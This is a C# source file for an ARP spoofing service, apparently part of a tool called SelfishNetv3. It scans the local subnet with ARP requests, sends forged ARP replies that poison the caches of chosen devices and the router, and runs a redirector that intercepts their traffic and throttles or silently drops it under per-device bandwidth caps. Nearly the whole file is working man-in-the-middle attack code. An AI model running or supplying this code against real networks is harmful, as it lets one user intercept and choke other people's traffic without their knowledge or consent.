using System;
using System.Buffers;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using PacketDotNet;
using Serilog;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SelfishNetv3
{
    /// <summary>
    /// Core ARP spoofing, network discovery, and packet redirection service.
    /// Uses SharpPcap (Npcap backend) for all packet capture and injection.
    /// </summary>
    public sealed class ArpSpoofService : IArpSpoofService
    {
        // ───── State ─────
        private readonly DeviceCollection _devices;
        private readonly NetworkInterface _nic;

        private ILiveDevice? _arpDevice;
        private ILiveDevice? _redirectDevice;

        private CancellationTokenSource? _arpListenerCts;
        private CancellationTokenSource? _redirectorCts;
        private CancellationTokenSource? _discoveryCts;

        private Task? _arpListenerTask;
        private Task? _redirectorTask;
        private Task? _discoveryTask;

        // ───── Network addresses ─────
        public byte[] LocalIP { get; }
        public byte[] LocalMAC { get; }
        public byte[] Netmask { get; }
        public byte[] RouterIP { get; }
        public byte[]? RouterMAC { get; private set; }

        private static readonly byte[] BroadcastMac = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
        private static readonly byte[] ZeroMac = new byte[6]; // 00:00:00:00:00:00 for ARP requests (RFC 826)

        /// <summary>
        /// Raised when a spoofing operation's status changes (start/stop/error).
        /// </summary>
        public event EventHandler<ArpStatusChangedEventArgs>? StatusChanged;

        // ───── Constructor ─────
        public ArpSpoofService(NetworkInterface nic, DeviceCollection devices)
        {
            _nic = nic ?? throw new ArgumentNullException(nameof(nic));
            _devices = devices ?? throw new ArgumentNullException(nameof(devices));

            var ipProps = nic.GetIPProperties();

            // Find first IPv4 unicast address
            var ipv4Addr = ipProps.UnicastAddresses
                .FirstOrDefault(a => a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);

            LocalIP = ipv4Addr?.Address.GetAddressBytes()
                ?? throw new InvalidOperationException("No IPv4 address found on selected adapter.");
            Netmask = ipv4Addr!.IPv4Mask.GetAddressBytes();
            LocalMAC = nic.GetPhysicalAddress().GetAddressBytes();

            RouterIP = ipProps.GatewayAddresses.Count > 0
                ? ipProps.GatewayAddresses[0].Address.GetAddressBytes()
                : throw new InvalidOperationException("No gateway address found on selected adapter.");
        }

        // ───── Device helpers ─────

        /// <summary>
        /// Opens a SharpPcap live device for the selected NIC.
        /// </summary>
        private ILiveDevice OpenDevice(string filter)
        {
            // Find the SharpPcap device matching our NIC
            var allDevices = CaptureDeviceList.Instance;
            var device = allDevices
                .OfType<LibPcapLiveDevice>()
                .FirstOrDefault(d => d.Interface?.FriendlyName == _nic.Name
                    || d.Description?.Contains(_nic.Description) == true
                    || d.Name.Contains(_nic.Id));

            if (device is null)
            {
                // Fallback: try matching by MAC address
                device = allDevices
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d =>
                    {
                        try
                        {
                            var addrs = d.Interface?.MacAddress?.GetAddressBytes();
                            return addrs != null && NetworkHelper.AreValuesEqual(addrs, LocalMAC);
                        }
                        catch { return false; }
                    });
            }

            if (device is null)
                throw new InvalidOperationException(
                    $"Could not find capture device for NIC '{_nic.Description}'. Ensure Npcap is installed.");

            device.Open(DeviceModes.Promiscuous, 1000);

            if (!string.IsNullOrEmpty(filter))
                device.Filter = filter;

            return device;
        }

        // ───── ARP Packet Construction ─────

        /// <summary>
        /// Builds a raw ARP packet using PacketDotNet.
        /// </summary>
        private static byte[] BuildArpPacket(
            byte[] ethDstMac, byte[] ethSrcMac,
            ArpOperation operation,
            byte[] arpSenderMac, byte[] arpSenderIp,
            byte[] arpTargetMac, byte[] arpTargetIp)
        {
            var arpPacket = new ArpPacket(
                operation,
                targetHardwareAddress: new PhysicalAddress(arpTargetMac),
                targetProtocolAddress: new IPAddress(arpTargetIp),
                senderHardwareAddress: new PhysicalAddress(arpSenderMac),
                senderProtocolAddress: new IPAddress(arpSenderIp));

            var ethernetPacket = new EthernetPacket(
                sourceHardwareAddress: new PhysicalAddress(ethSrcMac),
                destinationHardwareAddress: new PhysicalAddress(ethDstMac),
                EthernetType.Arp)
            {
                PayloadPacket = arpPacket
            };

            return ethernetPacket.Bytes;
        }

        // ───── ARP Listener (Discovery) ─────

        /// <summary>
        /// Starts listening for ARP reply packets to discover devices.
        /// </summary>
        public void StartArpListener()
        {
            if (_arpListenerTask is not null && !_arpListenerTask.IsCompleted)
                return;

            _arpDevice ??= OpenDevice("arp");
            _arpListenerCts = new CancellationTokenSource();
            var token = _arpListenerCts.Token;

            _arpListenerTask = Task.Run(() => ArpListenerLoop(token), token);
        }

        private void ArpListenerLoop(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    var status = _arpDevice!.GetNextPacket(out var capture);
                    if (status != GetPacketStatus.PacketRead)
                        continue;

                    var rawPacket = capture.GetPacket();
                    if (rawPacket?.Data is null)
                        continue;

                    var data = rawPacket.Data;

                    // Minimum ARP packet: 14 (Ethernet) + 28 (ARP) = 42 bytes
                    const int MIN_ARP_PACKET = 42;
                    if (data.Length < MIN_ARP_PACKET)
                        continue;

                    // Validate EtherType at offset 12-13: must be 0x0806 for ARP
                    ushort etherType = (ushort)((data[12] << 8) | data[13]);
                    if (etherType != 0x0806)
                        continue;

                    // Extract source MAC from Ethernet header (offset 6, length 6)
                    var srcMac = new byte[6];
                    Array.Copy(data, 6, srcMac, 0, 6);

                    // Skip packets from ourselves
                    if (NetworkHelper.AreValuesEqual(srcMac, LocalMAC))
                        continue;

                    // Check ARP operation at offset 20-21:
                    //   1 = ARP Request (passive discovery — learn from other devices' requests)
                    //   2 = ARP Reply   (active discovery — response to our requests)
                    byte arpOp = data[21];
                    if (arpOp != 1 && arpOp != 2)
                        continue;

                    // Extract sender MAC (offset 22, length 6) and sender IP (offset 28, length 4)
                    var senderMac = new byte[6];
                    var senderIp = new byte[4];
                    Array.Copy(data, 22, senderMac, 0, 6);
                    Array.Copy(data, 28, senderIp, 0, 4);

                    var device = new NetworkDevice
                    {
                        Ip = new IPAddress(senderIp),
                        Mac = new PhysicalAddress(senderMac),
                        CapDown = 0,
                        CapUp = 0,
                        IsLocalPc = false,
                        Name = string.Empty,
                        BytesReceivedSinceLastReset = 0,
                        BytesSentSinceLastReset = 0,
                        Redirect = true,
                        LastArpReplyTime = DateTime.Now,
                        TotalPacketReceived = 0,
                        TotalPacketSent = 0,
                        IsGateway = NetworkHelper.AreValuesEqual(senderIp, RouterIP)
                    };

                    if (device.IsGateway)
                        RouterMAC = senderMac;

                    _devices.AddDevice(device);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    Log.Error(ex, "ARP listener error");
                }
            }
        }

        /// <summary>
        /// Stops the ARP listener.
        /// </summary>
        public void StopArpListener()
        {
            if (_arpListenerCts is null) return;
            _arpListenerCts.Cancel();
            _arpListenerTask?.Wait(TimeSpan.FromSeconds(5));
            _arpListenerCts.Dispose();
            _arpListenerCts = null;
        }

        // ───── Network Discovery ─────

        /// <summary>
        /// Starts active network discovery by sending ARP requests to all IPs in the subnet.
        /// </summary>
        public void StartDiscovery()
        {
            if (_discoveryTask is not null && !_discoveryTask.IsCompleted)
                return;

            _discoveryCts = new CancellationTokenSource();
            var token = _discoveryCts.Token;

            _discoveryTask = Task.Run(() => DiscoveryLoop(token), token);
        }

        private void DiscoveryLoop(CancellationToken token)
        {
            try
            {
                var addresses = EnumerateSubnetAddresses().ToArray();
                Log.Information("Discovery: scanning {AddressCount} addresses in subnet",
                    addresses.Length);

                if (addresses.Length > 0)
                {
                    Log.Debug("Discovery: range {First} — {Last}",
                        addresses[0], addresses[^1]);
                }

                // Multiple sweep passes to catch devices that are slow to respond.
                // Many devices ignore the first ARP request or reply slowly.
                const int SWEEP_COUNT = 3;
                for (int sweep = 0; sweep < SWEEP_COUNT; sweep++)
                {
                    if (token.IsCancellationRequested) break;

                    Log.Debug("Discovery: sweep {Current}/{Total}", sweep + 1, SWEEP_COUNT);

                    foreach (var ip in addresses)
                    {
                        if (token.IsCancellationRequested)
                            break;

                        SendArpRequest(ip.ToString());
                        Thread.Sleep(5); // Yield CPU, avoid flooding
                    }

                    // Wait between sweeps to let devices respond
                    if (sweep < SWEEP_COUNT - 1 && !token.IsCancellationRequested)
                        Thread.Sleep(2000);
                }

                Log.Information("Discovery: completed all sweeps");
            }
            catch (OperationCanceledException) { }
            catch (Exception ex)
            {
                Log.Error(ex, "Discovery error");
            }
        }

        /// <summary>
        /// Enumerates all valid host addresses in the local subnet.
        /// Replaces the old deeply-nested loop approach.
        /// </summary>
        private System.Collections.Generic.IEnumerable<IPAddress> EnumerateSubnetAddresses()
        {
            // IP addresses are stored in network byte order (big-endian),
            // but BitConverter.ToUInt32 reads in little-endian on Windows.
            // Convert to host byte order for correct arithmetic.
            uint ipAddr = (uint)IPAddress.NetworkToHostOrder(
                (int)BitConverter.ToUInt32(LocalIP, 0));
            uint mask = (uint)IPAddress.NetworkToHostOrder(
                (int)BitConverter.ToUInt32(Netmask, 0));

            uint network = ipAddr & mask;
            uint broadcast = network | ~mask;

            // Iterate from network+1 to broadcast-1 (skip network and broadcast addresses)
            for (uint host = network + 1; host < broadcast; host++)
            {
                // Convert back to network byte order for IPAddress constructor
                byte[] bytes = BitConverter.GetBytes(
                    (uint)IPAddress.HostToNetworkOrder((int)host));
                yield return new IPAddress(bytes);
            }
        }

        /// <summary>
        /// Stops network discovery.
        /// </summary>
        public void StopDiscovery()
        {
            if (_discoveryCts is null) return;
            _discoveryCts.Cancel();
            _discoveryTask?.Wait(TimeSpan.FromSeconds(10));
            _discoveryCts.Dispose();
            _discoveryCts = null;
        }

        // ───── Packet Redirector ─────

        /// <summary>
        /// Starts the packet redirector that intercepts and forwards traffic
        /// between spoofed devices and the router.
        /// </summary>
        public int StartRedirector()
        {
            if (_redirectorTask is not null && !_redirectorTask.IsCompleted)
                return 0;

            try
            {
                _redirectDevice ??= OpenDevice("ip");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to open capture device for redirection: {ex.Message}");
                return -1;
            }

            _redirectorCts = new CancellationTokenSource();
            var token = _redirectorCts.Token;

            _redirectorTask = Task.Run(() => RedirectorLoop(token), token);
            return 0;
        }

        private void RedirectorLoop(CancellationToken token)
        {
            var router = _devices.GetRouter();
            if (router is not null)
                RouterMAC = router.Mac.GetAddressBytes();

            if (RouterMAC is null)
            {
                Log.Error("No router MAC found — cannot redirect packets");
                MessageBox.Show("No router found to redirect packets.");
                return;
            }

            // BUG #1 FIX: Create a local snapshot of RouterMAC to prevent
            // race condition if the ARP listener thread updates it mid-loop.
            byte[] routerMacLocal = RouterMAC;

            // Pre-allocate reusable buffers for MAC and IP extraction
            var srcMac = new byte[6];
            var dstMac = new byte[6];
            var dstIp = new byte[4];
            var srcIp = new byte[4];

            Log.Information("Redirector started — router MAC: {RouterMAC}",
                BitConverter.ToString(routerMacLocal));

            while (!token.IsCancellationRequested)
            {
                try
                {
                    var status = _redirectDevice!.GetNextPacket(out var capture);
                    if (status != GetPacketStatus.PacketRead)
                        continue;

                    var rawPacket = capture.GetPacket();
                    if (rawPacket?.Data is null)
                        continue;

                    var pktData = rawPacket.Data;

                    // Validate minimum packet size for Ethernet + IP header
                    // Minimum: 14 (Ethernet) + 20 (IP header) = 34 bytes
                    const int MIN_IP_PACKET = 34;
                    if (pktData.Length < MIN_IP_PACKET)
                        continue;

                    // Validate EtherType at offset 12-13: must be 0x0800 for IPv4
                    ushort etherType = (ushort)((pktData[12] << 8) | pktData[13]);
                    if (etherType != 0x0800)
                        continue;

                    // Validate IP version and header length
                    if (pktData[14] >> 4 != 4)  // Must be IPv4
                        continue;

                    int ipHeaderLen = (pktData[14] & 0x0F) * 4;
                    if (pktData.Length < 14 + ipHeaderLen)
                        continue;  // Packet too short for declared IP header

                    int pktLen = pktData.Length;

                    // Extract all addresses upfront for clarity
                    Array.Copy(pktData, 0, dstMac, 0, 6);    // Dest MAC at offset 0
                    Array.Copy(pktData, 6, srcMac, 0, 6);    // Source MAC at offset 6
                    Array.Copy(pktData, 14 + 12, srcIp, 0, 4); // Source IP at offset 26
                    Array.Copy(pktData, 14 + 16, dstIp, 0, 4); // Dest IP at offset 30

                    // ═══════════════════════════════════════════════════════════
                    // CASE 1: PACKET FROM LOCAL PC (our machine)
                    // ═══════════════════════════════════════════════════════════
                    if (NetworkHelper.AreValuesEqual(srcMac, LocalMAC))
                    {
                        if (NetworkHelper.AreValuesEqual(srcIp, LocalIP))
                        {
                            var localPc = _devices.GetLocalPC();
                            if (localPc is not null)
                                Interlocked.Add(ref localPc.bytesSentField, pktLen);
                        }
                        continue;
                    }

                    // ═══════════════════════════════════════════════════════════
                    // CASE 2: PACKET FROM ROUTER (destined for spoofed devices)
                    // ═══════════════════════════════════════════════════════════
                    if (NetworkHelper.AreValuesEqual(srcMac, routerMacLocal))
                    {
                        // Packet destined for us — count as received
                        if (NetworkHelper.AreValuesEqual(dstIp, LocalIP))
                        {
                            var localPc = _devices.GetLocalPC();
                            if (localPc is not null)
                                Interlocked.Add(ref localPc.bytesReceivedField, pktLen);
                            continue;
                        }

                        // Packet destined for a spoofed device — check cap and forward
                        var targetDevice = _devices.GetDeviceByIp(dstIp);
                        if (targetDevice is not null && targetDevice.Redirect)
                        {
                            // Token Bucket bandwidth control for downloads
                            bool shouldForward;
                            var downLimiter = targetDevice.DownloadLimiter;
                            if (downLimiter is not null)
                            {
                                shouldForward = downLimiter.TryConsume(pktLen);
                            }
                            else
                            {
                                // Fallback to legacy byte-cap if no Token Bucket
                                long downCap = targetDevice.CapDown;
                                long currentDlBytes = Interlocked.Read(ref targetDevice.bytesReceivedField);
                                shouldForward = (downCap == 0) || (currentDlBytes + pktLen <= downCap);
                            }

                            if (shouldForward)
                            {
                                // Rewrite Ethernet header: dst = target MAC, src = our MAC
                                var fwdData = new byte[pktLen];
                                Array.Copy(pktData, fwdData, pktLen);
                                Array.Copy(targetDevice.Mac.GetAddressBytes(), 0, fwdData, 0, 6);
                                Array.Copy(LocalMAC, 0, fwdData, 6, 6);
                                _redirectDevice.SendPacket(fwdData);
                                Interlocked.Add(ref targetDevice.bytesReceivedField, pktLen);
                            }
                            // else: drop packet silently (download cap exceeded)
                        }
                        continue;
                    }

                    // ═══════════════════════════════════════════════════════════
                    // CASE 3: PACKET FROM SPOOFED DEVICE (heading to router)
                    // ═══════════════════════════════════════════════════════════
                    // Skip if this packet is actually destined for us
                    if (NetworkHelper.AreValuesEqual(dstIp, LocalIP))
                        continue;

                    var sourceDevice = _devices.GetDeviceByMac(srcMac);
                    if (sourceDevice is not null && sourceDevice.Redirect)
                    {
                        // Token Bucket bandwidth control for uploads
                        bool shouldForward;
                        var upLimiter = sourceDevice.UploadLimiter;
                        if (upLimiter is not null)
                        {
                            shouldForward = upLimiter.TryConsume(pktLen);
                        }
                        else
                        {
                            // Fallback to legacy byte-cap if no Token Bucket
                            long upCap = sourceDevice.CapUp;
                            long currentUlBytes = Interlocked.Read(ref sourceDevice.bytesSentField);
                            shouldForward = (upCap == 0) || (currentUlBytes + pktLen <= upCap);
                        }

                        if (shouldForward)
                        {
                            // Rewrite Ethernet header: dst = router MAC, src = our MAC
                            var fwdData = new byte[pktLen];
                            Array.Copy(pktData, fwdData, pktLen);
                            Array.Copy(routerMacLocal, 0, fwdData, 0, 6);
                            Array.Copy(LocalMAC, 0, fwdData, 6, 6);
                            _redirectDevice.SendPacket(fwdData);
                            Interlocked.Add(ref sourceDevice.bytesSentField, pktLen);
                        }
                        // else: drop packet silently (upload cap exceeded)
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    Log.Error(ex, "Redirector error");
                }
            }

            Log.Information("Redirector stopped");
        }

        /// <summary>
        /// Stops the packet redirector.
        /// </summary>
        public void StopRedirector()
        {
            if (_redirectorCts is null) return;
            _redirectorCts.Cancel();
            _redirectorTask?.Wait(TimeSpan.FromSeconds(5));
            _redirectorCts.Dispose();
            _redirectorCts = null;
        }

        // ───── Spoofing ─────

        /// <summary>
        /// Spoofs ARP tables so traffic between ip1 and ip2 flows through us.
        /// </summary>
        public void Spoof(IPAddress ip1, IPAddress ip2)
        {
            var dev1 = _devices.GetDeviceByIp(ip1.GetAddressBytes());
            var dev2 = _devices.GetDeviceByIp(ip2.GetAddressBytes());

            if (dev1 is null || dev2 is null)
                return;

            // BUG #3 FIX: Create defensive copies to prevent race conditions.
            // GetAddressBytes() returns a reference to the underlying array which
            // could be mutated by the ARP listener thread between our calls.
            var mac1 = new byte[6];
            var mac2 = new byte[6];
            Array.Copy(dev1.Mac.GetAddressBytes(), mac1, 6);
            Array.Copy(dev2.Mac.GetAddressBytes(), mac2, 6);

            var ipBytes1 = new byte[4];
            var ipBytes2 = new byte[4];
            Array.Copy(dev1.Ip.GetAddressBytes(), ipBytes1, 4);
            Array.Copy(dev2.Ip.GetAddressBytes(), ipBytes2, 4);

            // Tell dev1 that dev2's IP is at our MAC
            SendPacketSafe(BuildArpPacket(mac1, LocalMAC, ArpOperation.Response,
                LocalMAC, ipBytes2, mac1, ipBytes1));

            // Tell dev2 that dev1's IP is at our MAC
            SendPacketSafe(BuildArpPacket(mac2, LocalMAC, ArpOperation.Response,
                LocalMAC, ipBytes1, mac2, ipBytes2));

            // Tell dev2 our real MAC (so it can reach us)
            SendPacketSafe(BuildArpPacket(LocalMAC, mac2, ArpOperation.Response,
                mac2, ipBytes2, LocalMAC, LocalIP));

            // Tell dev1 our real MAC (so it can reach us)
            SendPacketSafe(BuildArpPacket(LocalMAC, mac1, ArpOperation.Response,
                mac1, ipBytes1, LocalMAC, LocalIP));

            // Notify subscribers
            StatusChanged?.Invoke(this, new ArpStatusChangedEventArgs
            {
                TargetIp = ip1,
                IsActive = true,
                Message = $"Spoofing active between {ip1} and {ip2}"
            });
        }

        /// <summary>
        /// Restores the correct ARP mapping between ip1 and ip2 (un-spoof).
        /// </summary>
        public void UnSpoof(IPAddress ip1, IPAddress ip2)
        {
            var dev1 = _devices.GetDeviceByIp(ip1.GetAddressBytes());
            var dev2 = _devices.GetDeviceByIp(ip2.GetAddressBytes());

            if (dev1 is null || dev2 is null)
                return;

            // BUG #3 FIX: Create defensive copies to prevent race conditions.
            var mac1 = new byte[6];
            var mac2 = new byte[6];
            Array.Copy(dev1.Mac.GetAddressBytes(), mac1, 6);
            Array.Copy(dev2.Mac.GetAddressBytes(), mac2, 6);

            var ipBytes1 = new byte[4];
            var ipBytes2 = new byte[4];
            Array.Copy(dev1.Ip.GetAddressBytes(), ipBytes1, 4);
            Array.Copy(dev2.Ip.GetAddressBytes(), ipBytes2, 4);

            // Tell dev1 the real MAC of dev2
            SendPacketSafe(BuildArpPacket(mac1, mac2, ArpOperation.Request,
                mac2, ipBytes2, BroadcastMac, ipBytes1));

            // Tell dev2 the real MAC of dev1
            SendPacketSafe(BuildArpPacket(mac2, mac1, ArpOperation.Request,
                mac1, ipBytes1, BroadcastMac, ipBytes2));

            // Notify subscribers
            StatusChanged?.Invoke(this, new ArpStatusChangedEventArgs
            {
                TargetIp = ip1,
                IsActive = false,
                Message = $"ARP restored between {ip1} and {ip2}"
            });
        }

        /// <summary>
        /// Un-spoofs all discovered devices against the router.
        /// </summary>
        public void CompleteUnspoof()
        {
            var router = _devices.GetRouter();
            if (router is null) return;

            foreach (var device in _devices.GetAll())
            {
                UnSpoof(device.Ip, router.Ip);
            }
        }

        // ───── ARP Request ─────

        /// <summary>
        /// Sends an ARP request to discover the MAC address of the given IP.
        /// </summary>
        public void SendArpRequest(string ip)
        {
            EnsureArpDeviceOpen();

            var targetIp = IPAddress.Parse(ip).GetAddressBytes();
            var packet = BuildArpPacket(
                BroadcastMac, LocalMAC,
                ArpOperation.Request,
                LocalMAC, LocalIP,
                ZeroMac, targetIp);  // RFC 826: target MAC must be zeros in ARP requests

            SendPacketSafe(packet);
        }

        /// <summary>
        /// Sends an ARP request to discover the router's MAC address.
        /// </summary>
        public void FindMacRouter()
        {
            SendArpRequest(new IPAddress(RouterIP).ToString());
        }

        // ───── Helpers ─────

        private void EnsureArpDeviceOpen()
        {
            _arpDevice ??= OpenDevice("arp");
        }

        private void SendPacketSafe(byte[] packet)
        {
            try
            {
                _arpDevice?.SendPacket(packet);
            }
            catch (Exception ex)
            {
                Log.Warning(ex, "SendPacket error");
            }
        }

        // ───── Full Shutdown ─────

        /// <summary>
        /// Stops all background tasks, un-spoofs all devices, and releases resources.
        /// </summary>
        public void Shutdown()
        {
            StopDiscovery();
            StopArpListener();
            StopRedirector();
            CompleteUnspoof();
        }

        // ───── IDisposable ─────

        public void Dispose()
        {
            Shutdown();

            _arpDevice?.Close();
            _arpDevice?.Dispose();
            _arpDevice = null;

            _redirectDevice?.Close();
            _redirectDevice?.Dispose();
            _redirectDevice = null;
        }
    }
}
